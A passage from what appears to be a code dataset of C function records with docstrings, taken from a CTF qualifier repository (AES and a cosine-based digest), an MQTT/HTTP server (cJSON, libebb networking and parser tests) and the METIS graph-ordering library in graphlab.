aes_sbox[state[3][0] >> 4][state[3][0] & 0x0F];\n   state[3][1] = aes_sbox[state[3][1] >> 4][state[3][1] & 0x0F];\n   state[3][2] = aes_sbox[state[3][2] >> 4][state[3][2] & 0x0F];\n   state[3][3] = aes_sbox[state[3][3] >> 4][state[3][3] & 0x0F];\n}", "path": "thyself\\aes.c", "repo_name": "legitbs/quals-2013", "stars": 39, "license": "other", "language": "c", "size": 549}
{"docstring": "// Performs the AddRoundKey step. Each round has its own pre-generated 16-byte key in the\n// form of 4 integers (the \"w\" array). Each integer is XOR'd by one column of the state.\n// Also performs the job of InvAddRoundKey(); since the function is a simple XOR process,\n// it is its own inverse.\n", "func_signal": "void AddRoundKey(uchar state[][4], uint w[])", "code": "{\n   uchar subkey[4];\n   // memcpy(subkey,&w[idx],4); // Not accurate for big endian machines\n   // Subkey 1\n   subkey[0] = w[0] >> 24;\n   subkey[1] = w[0] >> 16;\n   subkey[2] = w[0] >> 8;\n   subkey[3] = w[0];\n   state[0][0] ^= subkey[0];\n   state[1][0] ^= subkey[1];\n   state[2][0] ^= subkey[2];\n   state[3][0] ^= subkey[3];\n   // Subkey 2\n   subkey[0] = w[1] >> 24;\n   subkey[1] = w[1] >> 16;\n   subkey[2] = w[1] >> 8;\n   subkey[3] = w[1];\n   state[0][1] ^= subkey[0];\n   state[1][1] ^= subkey[1];\n   state[2][1] ^= subkey[2];\n   state[3][1] ^= subkey[3];\n   // Subkey 3\n   subkey[0] = w[2] >> 24;\n   subkey[1] = w[2] >> 16;\n   subkey[2] = w[2] >> 8;\n   subkey[3] = w[2];\n   state[0][2] ^= subkey[0];\n   state[1][2] ^= subkey[1];\n   state[2][2] ^= subkey[2];\n   state[3][2] ^= subkey[3];\n   // Subkey 4\n   subkey[0] = w[3] >> 24;\n   subkey[1] = w[3] >> 16;\n   subkey[2] = w[3] >> 8;\n   subkey[3] = w[3];\n   state[0][3] ^= subkey[0];\n   state[1][3] ^= subkey[1];\n   state[2][3] ^= subkey[2];\n   state[3][3] ^= subkey[3];\n}", "path": "thyself\\aes.c", "repo_name": "legitbs/quals-2013", "stars": 39, "license": "other", "language": "c", "size": 549}
{"docstring": "/* I wrote this file and I don't care where it goes */\n", "func_signal": "void cos128( const unsigned char *input, size_t ilen, unsigned char output[16])", "code": "{\n    size_t i = ilen / 4;\n    long double j = 0;\n\n    while (i--)\n    {\n        j += cosl(((long double *)input)[i]);\n    }\n\n    memcpy( output, &j, 16);\n\n    return;\n}", "path": "bitterswallow\\cos.c", "repo_name": "legitbs/quals-2013", "stars": 39, "license": "other", "language": "c", "size": 549}
{"docstring": "// Invote print_string_ptr (which is useful) on an item.\n", "func_signal": "static char *print_string(cJSON *item)", "code": "{return print_string_ptr(item->valuestring);}\n\n// Predeclare these prototypes.\nstatic const char *parse_value(cJSON *item,const char *value);\nstatic char *print_value(cJSON *item,int depth,int fmt);\nstatic const char *parse_array(cJSON *item,const char *value);\nstatic char *print_array(cJSON *item,int depth,int fmt);\nstatic const char *parse_object(cJSON *item,const char *value);\nstatic char *print_object(cJSON *item,int depth,int fmt);\n\n// Utility to jump whitespace and cr/lf\nstatic const char *skip(const char *in) {while (in && (unsigned char)*in<=32) in++; return in;}\n\n// Parse an object - create a new root, and populate.\ncJSON *cJSON_Parse(const char *value)\n{\n\tcJSON *c=cJSON_New_Item();\n\tif (!c) return 0;       /* memory fail */\n\n\tif (!parse_value(c,skip(value))) {cJSON_Delete(c);return 0;}\n\treturn c;\n}", "path": "common\\cJSON.c", "repo_name": "tobyjaffey/mqtt-http-server", "stars": 50, "license": "None", "language": "c", "size": 255}
{"docstring": "/**\n * Begin the server listening on a file descriptor.  This DOES NOT start the\n * event loop.  Start the event loop after making this call.\n */\n", "func_signal": "int \nebb_server_listen_on_fd(ebb_server *server, const int fd)", "code": "{\n  assert(server->listening == FALSE);\n\n  if (listen(fd, EBB_MAX_CONNECTIONS) < 0) {\n    perror(\"listen()\");\n    return -1;\n  }\n  \n  set_nonblock(fd); /* XXX superfluous? */\n  \n  server->fd = fd;\n  server->listening = TRUE;\n  \n  ev_io_set (&server->connection_watcher, server->fd, EV_READ);\n  ev_io_start (server->loop, &server->connection_watcher);\n  \n  return server->fd;\n}", "path": "libebb\\ebb.c", "repo_name": "tobyjaffey/mqtt-http-server", "stars": 50, "license": "None", "language": "c", "size": 255}
{"docstring": "/////////////////////////////////////////\n", "func_signal": "int httpd_init(ebb_server *server, struct ev_loop *loop)", "code": "{\n    ebb_server_init(server, loop);\n    server->new_connection = on_new_connection;\n    return 0;\n}", "path": "httpd.c", "repo_name": "tobyjaffey/mqtt-http-server", "stars": 50, "license": "None", "language": "c", "size": 255}
{"docstring": "/**\n * Begin the server listening on a file descriptor This DOES NOT start the\n * event loop. Start the event loop after making this call.\n */\n", "func_signal": "int \nebb_server_listen_on_port(ebb_server *server, const int port)", "code": "{\n  int fd = -1;\n  struct linger ling = {0, 0};\n  struct sockaddr_in addr;\n  int flags = 1;\n  \n  if ((fd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {\n    perror(\"socket()\");\n    goto error;\n  }\n  \n  flags = 1;\n  setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, (void *)&flags, sizeof(flags));\n  setsockopt(fd, SOL_SOCKET, SO_KEEPALIVE, (void *)&flags, sizeof(flags));\n  setsockopt(fd, SOL_SOCKET, SO_LINGER, (void *)&ling, sizeof(ling));\n\n  /* XXX: Sending single byte chunks in a response body? Perhaps there is a\n   * need to enable the Nagel algorithm dynamically. For now disabling.\n   */\n  setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, (void *)&flags, sizeof(flags));\n  \n  /* the memset call clears nonstandard fields in some impementations that\n   * otherwise mess things up.\n   */\n  memset(&addr, 0, sizeof(addr));\n  \n  addr.sin_family = AF_INET;\n  addr.sin_port = htons(port);\n  addr.sin_addr.s_addr = htonl(INADDR_ANY);\n  \n  if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {\n    perror(\"bind()\");\n    goto error;\n  }\n  \n  int ret = ebb_server_listen_on_fd(server, fd);\n  if (ret >= 0) {\n    sprintf(server->port, \"%d\", port);\n  }\n  return ret;\nerror:\n  if(fd > 0) close(fd);\n  return -1;\n}", "path": "libebb\\ebb.c", "repo_name": "tobyjaffey/mqtt-http-server", "stars": 50, "license": "None", "language": "c", "size": 255}
{"docstring": "/* Internal callback \n * called by connection->write_watcher\n */\n", "func_signal": "static void \non_writable(struct ev_loop *loop, ev_io *watcher, int revents)", "code": "{\n  ebb_connection *connection = watcher->data;\n  ssize_t sent;\n  ev_io *w = &connection->handshake_watcher;\n  \n  //printf(\"on_writable\\n\");\n\n  assert(CONNECTION_HAS_SOMETHING_TO_WRITE);\n  assert(connection->written <= connection->to_write_len);\n  // TODO -- why is this broken?\n  //assert(ev_is_active(&connection->timeout_watcher));\n  assert(watcher == &connection->write_watcher);\n\n  if(connection->to_write == 0)\n    goto stop_writing;\n\n#ifdef HAVE_GNUTLS\n  assert(!ev_is_active(w));\n\n  if(connection->server->secure) {\n    sent = gnutls_record_send( connection->session\n                             , connection->to_write + connection->written\n                             , connection->to_write_len - connection->written\n                             ); \n    if(sent < 0) {\n      if(gnutls_error_is_fatal(sent)) goto error;\n      if( (sent == GNUTLS_E_INTERRUPTED || sent == GNUTLS_E_AGAIN)\n       && GNUTLS_NEED_READ\n        ) ev_io_stop(loop, watcher);\n      return; \n    }\n  } else {\n#endif /* HAVE_GNUTLS */\n\n    sent = nosigpipe_push( (void*)(intptr_t)connection->fd\n                         , connection->to_write + connection->written\n                         , connection->to_write_len - connection->written\n                         );\n    if(sent < 0) goto error;\n    if(sent == 0) return;\n\n#ifdef HAVE_GNUTLS\n  }\n#endif /* HAVE_GNUTLS */\n\n  ebb_connection_reset_timeout(connection);\n\n  connection->written += sent;\n\n  if(connection->written == connection->to_write_len) {\n    goto stop_writing;\n  }\n  return;\nstop_writing:\n  ev_io_stop(loop, watcher);\n  connection->to_write = NULL;\n\n  if(connection->after_write_cb)\n    connection->after_write_cb(connection);\n  return;\nerror:\n  error(\"close connection on write.\");\n  ebb_connection_schedule_close(connection);\n}", "path": "libebb\\ebb.c", "repo_name": "tobyjaffey/mqtt-http-server", "stars": 50, "license": "None", "language": "c", "size": 255}
{"docstring": "// Build an array from input text.\n", "func_signal": "static const char *parse_array(cJSON *item,const char *value)", "code": "{\n\tcJSON *child;\n\tif (*value!='[')\treturn 0;\t// not an array!\n\n\titem->type=cJSON_Array;\n\tvalue=skip(value+1);\n\tif (*value==']') return value+1;\t// empty array.\n\n\titem->child=child=cJSON_New_Item();\n\tif (!item->child) return 0;\t\t // memory fail\n\tvalue=skip(parse_value(child,skip(value)));\t// skip any spacing, get the value.\n\tif (!value) return 0;\n\n\twhile (*value==',')\n\t{\n\t\tcJSON *new_item;\n\t\tif (!(new_item=cJSON_New_Item())) return 0; \t// memory fail\n\t\tchild->next=new_item;new_item->prev=child;child=new_item;\n\t\tvalue=skip(parse_value(child,skip(value+1)));\n\t\tif (!value) return 0;\t// memory fail\n\t}\n\n\tif (*value==']') return value+1;\t// end of array\n\treturn 0;\t// malformed.\n}", "path": "common\\cJSON.c", "repo_name": "tobyjaffey/mqtt-http-server", "stars": 50, "license": "None", "language": "c", "size": 255}
{"docstring": "/**\n * Stops the server. Will not accept new connections.  Does not drop\n * existing connections.\n */\n", "func_signal": "void \nebb_server_unlisten(ebb_server *server)", "code": "{\n  if(server->listening) {\n    ev_io_stop(server->loop, &server->connection_watcher);\n    close(server->fd);\n    server->port[0] = '\\0';\n    server->listening = FALSE;\n  }\n}", "path": "libebb\\ebb.c", "repo_name": "tobyjaffey/mqtt-http-server", "stars": 50, "license": "None", "language": "c", "size": 255}
{"docstring": "/**\n * Initialize an ebb_server structure.  After calling ebb_server_init set\n * the callback server->new_connection and, optionally, callback data\n * server->data.  The new connection MUST be initialized with\n * ebb_connection_init before returning it to the server.\n *\n * @param server the server to initialize\n * @param loop a libev loop\n */\n", "func_signal": "void \nebb_server_init(ebb_server *server, struct ev_loop *loop)", "code": "{\n  ev_io *w;\n\n  server->loop = loop;\n  server->listening = FALSE;\n  server->port[0] = '\\0';\n  server->fd = -1;\n  server->connection_watcher.data = server;\n  w = &server->connection_watcher;\n  ev_init (w, on_connection);\n  server->secure = FALSE;\n\n#ifdef HAVE_GNUTLS\n  rbtree_init(&server->session_cache, session_cache_compare);\n  server->credentials = NULL;\n#endif\n\n  server->new_connection = NULL;\n  server->data = NULL;\n}", "path": "libebb\\ebb.c", "repo_name": "tobyjaffey/mqtt-http-server", "stars": 50, "license": "None", "language": "c", "size": 255}
{"docstring": "/* similar to server_init. \n *\n * the user of secure server might want to set additional callbacks from\n * GNUTLS. In particular \n * gnutls_global_set_mem_functions() \n * gnutls_global_set_log_function()\n * Also see the note above ebb_connection_init() about setting gnutls cache\n * access functions\n *\n * cert_file: the filename of a PEM certificate file\n *\n * key_file: the filename of a private key. Currently only PKCS-1 encoded\n * RSA and DSA private keys are accepted. \n */\n", "func_signal": "int \nebb_server_set_secure (ebb_server *server, const char *cert_file, const char *key_file)", "code": "{\n  server->secure = TRUE;\n  gnutls_global_init();\n  gnutls_certificate_allocate_credentials(&server->credentials);\n  /* todo gnutls_certificate_free_credentials */\n  int r = gnutls_certificate_set_x509_key_file( server->credentials\n                                              , cert_file\n                                              , key_file\n                                              , GNUTLS_X509_FMT_PEM\n                                              );\n  if(r < 0) {\n    error(\"loading certificates\");\n    return -1;\n  }\n  return 1;\n}", "path": "libebb\\ebb.c", "repo_name": "tobyjaffey/mqtt-http-server", "stars": 50, "license": "None", "language": "c", "size": 255}
{"docstring": "// Render the cstring provided to an escaped version that can be printed.\n", "func_signal": "static char *print_string_ptr(const char *str)", "code": "{\n\tconst char *ptr;char *ptr2,*out;int len=0;\n\t\n\tif (!str) return cJSON_strdup(\"\");\n\tptr=str;while (*ptr && ++len) {if ((unsigned char)*ptr<32 || *ptr=='\\\"' || *ptr=='\\\\') len++;ptr++;}\n\t\n\tout=(char*)cJSON_malloc(len+3);\n\tptr2=out;ptr=str;\n\t*ptr2++='\\\"';\n\twhile (*ptr)\n\t{\n\t\tif ((unsigned char)*ptr>31 && *ptr!='\\\"' && *ptr!='\\\\') *ptr2++=*ptr++;\n\t\telse\n\t\t{\n\t\t\t*ptr2++='\\\\';\n\t\t\tswitch (*ptr++)\n\t\t\t{\n\t\t\t\tcase '\\\\':\t*ptr2++='\\\\';\tbreak;\n\t\t\t\tcase '\\\"':\t*ptr2++='\\\"';\tbreak;\n\t\t\t\tcase '\\b':\t*ptr2++='b';\tbreak;\n\t\t\t\tcase '\\f':\t*ptr2++='f';\tbreak;\n\t\t\t\tcase '\\n':\t*ptr2++='n';\tbreak;\n\t\t\t\tcase '\\r':\t*ptr2++='r';\tbreak;\n\t\t\t\tcase '\\t':\t*ptr2++='t';\tbreak;\n\t\t\t\tdefault: ptr2--;\tbreak;\t// eviscerate with prejudice.\n\t\t\t}\n\t\t}\n\t}\n\t*ptr2++='\\\"';*ptr2++=0;\n\treturn out;\n}", "path": "common\\cJSON.c", "repo_name": "tobyjaffey/mqtt-http-server", "stars": 50, "license": "None", "language": "c", "size": 255}
{"docstring": "// Render the number nicely from the given item into a string.\n", "func_signal": "static char *print_number(cJSON *item)", "code": "{\n\tchar *str;\n\tdouble d=item->valuedouble;\n\tif (fabs(((double)item->valueint)-d)<=DBL_EPSILON && d<=INT_MAX && d>=INT_MIN)\n\t{\n\t\tstr=(char*)cJSON_malloc(21);\t// 2^64+1 can be represented in 21 chars.\n\t\tsprintf(str,\"%d\",item->valueint);\n\t}\n\telse\n\t{\n\t\tstr=(char*)cJSON_malloc(64);\t// This is a nice tradeoff.\n\t\tif (fabs(floor(d)-d)<=DBL_EPSILON)\t\t\tsprintf(str,\"%.0f\",d);\n\t\telse if (fabs(d)<1.0e-6 || fabs(d)>1.0e9)\tsprintf(str,\"%e\",d);\n\t\telse\t\t\t\t\t\t\t\t\t\tsprintf(str,\"%f\",d);\n\t}\n\treturn str;\n}", "path": "common\\cJSON.c", "repo_name": "tobyjaffey/mqtt-http-server", "stars": 50, "license": "None", "language": "c", "size": 255}
{"docstring": "// Delete a cJSON structure.\n", "func_signal": "void cJSON_Delete(cJSON *c)", "code": "{\n\tcJSON *next;\n\twhile (c)\n\t{\n\t\tnext=c->next;\n\t\tif (!(c->type&cJSON_IsReference) && c->child) cJSON_Delete(c->child);\n\t\tif (!(c->type&cJSON_IsReference) && c->valuestring) cJSON_free(c->valuestring);\n\t\tif (c->string) cJSON_free(c->string);\n\t\tcJSON_free(c);\n\t\tc=next;\n\t}\n}", "path": "common\\cJSON.c", "repo_name": "tobyjaffey/mqtt-http-server", "stars": 50, "license": "None", "language": "c", "size": 255}
{"docstring": "// Render a cJSON item/entity/structure to text.\n", "func_signal": "char *cJSON_Print(cJSON *item)", "code": "{return print_value(item,0,1);}\nchar *cJSON_PrintUnformatted(cJSON *item)\t{return print_value(item,0,0);}\n\nstatic int isNumber(const char *s)\n{\n    int num_dots = 0;\n    if (*s == '-')\n        s++;\n    while(*s)\n    {\n        if (*s < '0' || *s > '9')\n        {\n            if (num_dots == 0 && *s == '.')\n                num_dots++;\n            else\n                return 0;\n        }\n        s++;\n    }\n    return 1;\n}", "path": "common\\cJSON.c", "repo_name": "tobyjaffey/mqtt-http-server", "stars": 50, "license": "None", "language": "c", "size": 255}
{"docstring": "// Render an array to text\n", "func_signal": "static char *print_array(cJSON *item,int depth,int fmt)", "code": "{\n\tchar **entries;\n\tchar *out=0,*ptr,*ret;int len=5;\n\tcJSON *child=item->child;\n\tint numentries=0,i=0,fail=0;\n\t\n\t// How many entries in the array?\n\twhile (child) numentries++,child=child->next;\n\t// Allocate an array to hold the values for each\n\tentries=(char**)cJSON_malloc(numentries*sizeof(char*));\n\tif (!entries) return 0;\n\tmemset(entries,0,numentries*sizeof(char*));\n\t// Retrieve all the results:\n\tchild=item->child;\n\twhile (child && !fail)\n\t{\n\t\tret=print_value(child,depth+1,fmt);\n\t\tentries[i++]=ret;\n\t\tif (ret) len+=strlen(ret)+2+(fmt?1:0); else fail=1;\n\t\tchild=child->next;\n\t}\n\t\n\t// If we didn't fail, try to malloc the output string\n\tif (!fail) out=cJSON_malloc(len);\n\t// If that fails, we fail.\n\tif (!out) fail=1;\n\n\t// Handle failure.\n\tif (fail)\n\t{\n\t\tfor (i=0;i<numentries;i++) if (entries[i]) cJSON_free(entries[i]);\n\t\tcJSON_free(entries);\n\t\treturn 0;\n\t}\n\t\n\t// Compose the output array.\n\t*out='[';\n\tptr=out+1;*ptr=0;\n\tfor (i=0;i<numentries;i++)\n\t{\n\t\tstrcpy(ptr,entries[i]);ptr+=strlen(entries[i]);\n\t\tif (i!=numentries-1) {*ptr++=',';if(fmt)*ptr++=' ';*ptr=0;}\n\t\tcJSON_free(entries[i]);\n\t}\n\tcJSON_free(entries);\n\t*ptr++=']';*ptr++=0;\n\treturn out;\t\n}", "path": "common\\cJSON.c", "repo_name": "tobyjaffey/mqtt-http-server", "stars": 50, "license": "None", "language": "c", "size": 255}
{"docstring": "////////////////////////\n", "func_signal": "static void ebb_request_destroy(ebb_request *request)", "code": "{\n    ebb_request_info *request_info;\n\n    LOG_DEBUG(\"*********** ebb_request_destroy %p\", request);\n\n    if (request != NULL)\n    {\n        request_info = (ebb_request_info *)request->data;\n        if (NULL != request_info)\n        {\n            if (request_info->body != NULL)\n                free(request_info->body);\n            if (request_info->path != NULL)\n                free(request_info->path);\n            if (request_info->uri != NULL)\n                free(request_info->uri);\n            if (request_info->auth != NULL)\n                free(request_info->auth);\n\n            free(request_info);\n        }\n        free(request);\n    }\n}", "path": "httpd.c", "repo_name": "tobyjaffey/mqtt-http-server", "stars": 50, "license": "None", "language": "c", "size": 255}
{"docstring": "// path will always start with '/', may end with it\n", "func_signal": "int httpd_request_cb(uint32_t connid, const char *host, uint32_t method, const char *uri_str, const char *path, const char *body_data, size_t body_len, const char *auth)", "code": "{\n    size_t i = 0;\n    char *pathstr = NULL;\n    char *bodystr = NULL;\n    char *path_argv[MAX_PATH_ELEMS];\n    int path_argc = 0;\n    int rc;\n    ebb_connection_info *conninfo;\n    int vhost;\n\n    LOG_DEBUG(\"httpd_request_cb host=%s uri_str=%s, path=%s, auth=%s\", host, uri_str, path, auth);\n\n    if ((vhost = httpd_lookupvirt(host)) < 0)\n    {\n        LOG_DEBUG(\"VHOST DEFAULT\");\n    }\n    else\n    {\n        LOG_DEBUG(\"VHOST = %s\", g_srvctx.vhttpd[vhost].name);\n    }\n\n    if (NULL == (conninfo = httpd_get_conninfo(connid)))\n    {\n        LOG_ERROR(\"bad connid\");\n        return 1;\n    }\n\n    // dissociate conn from streams, left from last req\n    idset_foreach(conninfo->streamids, strm_clr, NULL);\n    // FIXME, may be other inter-req cleanup to do here also\n\n    if (NULL == (pathstr = strdup(path)))\n        goto fail;\n    \n    if (NULL == (bodystr = (char *)calloc(1, body_len+1)))\n    {\n        LOG_ERROR(\"out of mem for bodystr\");\n        goto fail;\n    }\n    memcpy(bodystr, body_data, body_len);\n\n    while(i < strlen(path))\n    {\n        if (pathstr[i] == '/')\n        {\n            pathstr[i] = 0;\n            if (path_argc >= MAX_PATH_ELEMS)\n            {\n                LOG_ERROR(\"too many path elems\");\n                goto fail;\n            }\n            path_argv[path_argc++] = pathstr + i + 1;\n        }\n        i++;\n    }\n\n    // chop off any empty / element\n    if (path_argc > 0)\n    {\n        if (*path_argv[path_argc-1] == 0 || *path_argv[path_argc-1] == '/')\n            path_argc--;\n    }\n\n    conninfo->rawmode = false;\n\n    rc = webapi_command(connid, method, path_argc, path_argv, bodystr, path, uri_str, auth, vhost);\n\n    conninfo->ifmodifiedsince = 0;  // FIXME, need to reset this after, should be doing these things more cleanly\n\n    free(pathstr);\n    free(bodystr);\n    return rc;\nfail:\n    if (NULL != pathstr)\n        free(pathstr);\n    if (NULL != bodystr)\n        free(bodystr);\n    return 1;\n}", "path": "webapi.c", "repo_name": "tobyjaffey/mqtt-http-server", "stars": 50, "license": "None", "language": "c", "size": 255}
{"docstring": "// Internal constructor.\n", "func_signal": "static cJSON *cJSON_New_Item()", "code": "{\n\tcJSON* node = (cJSON*)cJSON_malloc(sizeof(cJSON));\n\tif (node) memset(node,0,sizeof(cJSON));\n\treturn node;\n}", "path": "common\\cJSON.c", "repo_name": "tobyjaffey/mqtt-http-server", "stars": 50, "license": "None", "language": "c", "size": 255}
{"docstring": "/**\n * Writes a string to the socket. This is actually sets a watcher\n * which may take multiple iterations to write the entire string.\n *\n * This can only be called once at a time. If you call it again\n * while the connection is writing another buffer the ebb_connection_write\n * will return FALSE and ignore the request.\n */\n", "func_signal": "int \nebb_connection_write (ebb_connection *connection, const char *buf, size_t len, ebb_after_write_cb cb)", "code": "{\n  ev_io *w = &connection->write_watcher;\n  if(ev_is_active(w))\n    return FALSE;\n  assert(!CONNECTION_HAS_SOMETHING_TO_WRITE);\n  connection->to_write = buf;\n  connection->to_write_len = len;\n  connection->written = 0;\n  connection->after_write_cb = cb;\n  ev_io_start(connection->server->loop, &connection->write_watcher);\n  return TRUE;\n}", "path": "libebb\\ebb.c", "repo_name": "tobyjaffey/mqtt-http-server", "stars": 50, "license": "None", "language": "c", "size": 255}
{"docstring": "// Parse the input text to generate a number, and populate the result into item.\n", "func_signal": "static const char *parse_number(cJSON *item,const char *num)", "code": "{\n\tdouble n=0,sign=1,scale=0;int subscale=0,signsubscale=1;\n\n\t// Could use sscanf for this?\n\tif (*num=='-') sign=-1,num++;\t// Has sign?\n\tif (*num=='0') num++;\t\t\t// is zero\n\tif (*num>='1' && *num<='9')\tdo\tn=(n*10.0)+(*num++ -'0');\twhile (*num>='0' && *num<='9');\t// Number?\n\tif (*num=='.') {num++;\t\tdo\tn=(n*10.0)+(*num++ -'0'),scale--; while (*num>='0' && *num<='9');}\t// Fractional part?\n\tif (*num=='e' || *num=='E')\t\t// Exponent?\n\t{\tnum++;if (*num=='+') num++;\telse if (*num=='-') signsubscale=-1,num++;\t\t// With sign?\n\t\twhile (*num>='0' && *num<='9') subscale=(subscale*10)+(*num++ - '0');\t// Number?\n\t}\n\n\tn=sign*n*pow(10.0,(scale+subscale*signsubscale));\t// number = +/- number.fraction * 10^+/- exponent\n\t\n\titem->valuedouble=n;\n\titem->valueint=(int)n;\n\titem->type=cJSON_Number;\n\treturn num;\n}", "path": "common\\cJSON.c", "repo_name": "tobyjaffey/mqtt-http-server", "stars": 50, "license": "None", "language": "c", "size": 255}
{"docstring": "/**\n * SCAN through every possible breaking to make sure the \n * parser can handle getting the content in any chunks that\n * might come from the socket\n */\n", "func_signal": "int test_scan2\n  ( const struct request_data *r1\n  , const struct request_data *r2\n  , const struct request_data *r3\n  )", "code": "{\n  char total[80*1024] = \"\\0\";\n  char buf1[80*1024] = \"\\0\";\n  char buf2[80*1024] = \"\\0\";\n\n  strcat(total, r1->raw); \n  strcat(total, r2->raw); \n  strcat(total, r3->raw); \n\n  int total_len = strlen(total);\n\n  //printf(\"total_len = %d\\n\", total_len);\n  int i;\n  for(i = 1; i < total_len - 1; i ++ ) {\n\n    parser_init();\n\n    int buf1_len = i;\n    strncpy(buf1, total, buf1_len);\n    buf1[buf1_len] = 0;\n\n    int buf2_len = total_len - i;\n    strncpy(buf2, total+i, buf2_len);\n    buf2[buf2_len] = 0;\n\n    ebb_request_parser_execute(&parser, buf1, buf1_len);\n\n    if( ebb_request_parser_has_error(&parser) ) {\n      return FALSE;\n    }\n    /*\n    if(ebb_request_parser_is_finished(&parser)) \n      return FALSE;\n    */\n\n    ebb_request_parser_execute(&parser, buf2, buf2_len);\n\n    if( ebb_request_parser_has_error(&parser))\n      return FALSE;\n    if(!ebb_request_parser_is_finished(&parser)) \n      return FALSE;\n\n    if(3 != num_requests) {\n      printf(\"scan error: got %d requests in iteration %d\\n\", num_requests, i);\n      return FALSE;\n    }\n\n    if(!request_eq(0, r1)) {\n      printf(\"not maching r1\\n\");\n      return FALSE;\n    }\n    if(!request_eq(1, r2)) {\n      printf(\"not maching r2\\n\");\n      return FALSE;\n    }\n    if(!request_eq(2, r3)) {\n      printf(\"not maching r3\\n\");\n      return FALSE;\n    }\n  }\n  return TRUE;\n}", "path": "libebb\\test_request_parser.c", "repo_name": "tobyjaffey/mqtt-http-server", "stars": 50, "license": "None", "language": "c", "size": 255}
{"docstring": "/*************************************************************************\n* This function perfoms a dfs starting from an unmatched col node\n* forming alternate paths\n**************************************************************************/\n", "func_signal": "void MinCover_ColDFS(idxtype *xadj, idxtype *adjncy, idxtype root, idxtype *mate, idxtype *where, idxtype flag)", "code": "{\n  idxtype i;\n\n  if (flag == INCOL) {\n    if (where[root] == HC)\n      return;\n    where[root] = HC;\n    for (i=xadj[root]; i<xadj[root+1]; i++) \n      MinCover_ColDFS(xadj, adjncy, adjncy[i], mate, where, INROW);\n  }\n  else {\n    if (where[root] == HR)\n      return;\n    where[root] = HR;\n    if (mate[root] != -1)\n      MinCover_ColDFS(xadj, adjncy, mate[root], mate, where, INCOL);\n  }\n\n}", "path": "src\\graphlab\\extern\\metis\\libmetis\\mincover.c", "repo_name": "ekoontz/graphlab", "stars": 32, "license": "bsd-3-clause", "language": "c", "size": 745}
{"docstring": "/*************************************************************************\n* This function returns the current ammount of dynamically allocated\n* memory that is used by the system\n**************************************************************************/\n", "func_signal": "size_t gk_GetCurMemoryUsed()", "code": "{\n  struct mallinfo meminfo;\n  size_t cused=0;\n\n#ifdef GKMSPACE\n  if (gk_mspace != 0) {\n    meminfo = mspace_mallinfo(gk_mspace);\n    cused = meminfo.uordblks;\n  }\n#else\n  meminfo = dlmallinfo();\n  cused = meminfo.uordblks;\n#endif\n\n  return cused;\n}", "path": "src\\graphlab\\extern\\metis\\GKlib\\memory.c", "repo_name": "ekoontz/graphlab", "stars": 32, "license": "bsd-3-clause", "language": "c", "size": 745}
{"docstring": "/*************************************************************************\n* This function is the entry point for ONCMETIS\n**************************************************************************/\n", "func_signal": "void METIS_NodeND(idxtype *nvtxs, idxtype *xadj, idxtype *adjncy, idxtype *numflag, idxtype *options, \n                  idxtype *perm, idxtype *iperm)", "code": "{\n  idxtype i, ii, j, l, wflag, nflag;\n  GraphType graph;\n  CtrlType ctrl;\n  idxtype *cptr, *cind, *piperm;\n\n  if (*numflag == 1)\n    Change2CNumbering(*nvtxs, xadj, adjncy);\n\n  if (options[0] == 0) {  /* Use the default parameters */\n    ctrl.CType   = ONMETIS_CTYPE;\n    ctrl.IType   = ONMETIS_ITYPE;\n    ctrl.RType   = ONMETIS_RTYPE;\n    ctrl.dbglvl  = ONMETIS_DBGLVL;\n    ctrl.oflags  = ONMETIS_OFLAGS;\n    ctrl.pfactor = ONMETIS_PFACTOR;\n    ctrl.nseps   = ONMETIS_NSEPS;\n  }\n  else {\n    ctrl.CType   = options[OPTION_CTYPE];\n    ctrl.IType   = options[OPTION_ITYPE];\n    ctrl.RType   = options[OPTION_RTYPE];\n    ctrl.dbglvl  = options[OPTION_DBGLVL];\n    ctrl.oflags  = options[OPTION_OFLAGS];\n    ctrl.pfactor = options[OPTION_PFACTOR];\n    ctrl.nseps   = options[OPTION_NSEPS];\n  }\n  if (ctrl.nseps < 1)\n    ctrl.nseps = 1;\n\n  ctrl.optype = OP_ONMETIS;\n  ctrl.CoarsenTo = 100;\n\n  IFSET(ctrl.dbglvl, DBG_TIME, InitTimers(&ctrl));\n  IFSET(ctrl.dbglvl, DBG_TIME, gk_startcputimer(ctrl.TotalTmr));\n\n  InitRandom(-1);\n\n  if (ctrl.pfactor > 0) { \n    /*============================================================\n    * Prune the dense columns\n    ==============================================================*/\n    piperm = idxmalloc(*nvtxs, \"ONMETIS: piperm\");\n\n    PruneGraph(&ctrl, &graph, *nvtxs, xadj, adjncy, piperm, (float)(0.1*ctrl.pfactor));\n  }\n  else if (ctrl.oflags&OFLAG_COMPRESS) {\n    /*============================================================\n    * Compress the graph \n    ==============================================================*/\n    cptr = idxmalloc(*nvtxs+1, \"ONMETIS: cptr\");\n    cind = idxmalloc(*nvtxs, \"ONMETIS: cind\");\n\n    CompressGraph(&ctrl, &graph, *nvtxs, xadj, adjncy, cptr, cind);\n\n    if (graph.nvtxs >= COMPRESSION_FRACTION*(*nvtxs)) {\n      ctrl.oflags--; /* We actually performed no compression */\n      gk_free((void **)&cptr, &cind, LTERM);\n    }\n    else if (2*graph.nvtxs < *nvtxs && ctrl.nseps == 1)\n      ctrl.nseps = 2;\n  }\n  else {\n    SetUpGraph(&graph, OP_ONMETIS, *nvtxs, 1, xadj, adjncy, NULL, NULL, 0);\n  }\n\n\n  /*=============================================================\n  * Do the nested dissection ordering \n  --=============================================================*/\n  ctrl.maxvwgt = 1.5*(idxsum(graph.nvtxs, graph.vwgt, 1)/ctrl.CoarsenTo);\n  AllocateWorkSpace(&ctrl, &graph, 2);\n\n  if (ctrl.oflags&OFLAG_CCMP) \n    MlevelNestedDissectionCC(&ctrl, &graph, iperm, ORDER_UNBALANCE_FRACTION, graph.nvtxs);\n  else\n    MlevelNestedDissection(&ctrl, &graph, iperm, ORDER_UNBALANCE_FRACTION, graph.nvtxs);\n\n  FreeWorkSpace(&ctrl, &graph);\n\n  if (ctrl.pfactor > 0) { /* Order any prunned vertices */\n    if (graph.nvtxs < *nvtxs) { \n      idxcopy(graph.nvtxs, iperm, perm);  /* Use perm as an auxiliary array */\n      for (i=0; i<graph.nvtxs; i++)\n        iperm[piperm[i]] = perm[i];\n      for (i=graph.nvtxs; i<*nvtxs; i++)\n        iperm[piperm[i]] = i;\n    }\n\n    gk_free((void **)&piperm, LTERM);\n  }\n  else if (ctrl.oflags&OFLAG_COMPRESS) { /* 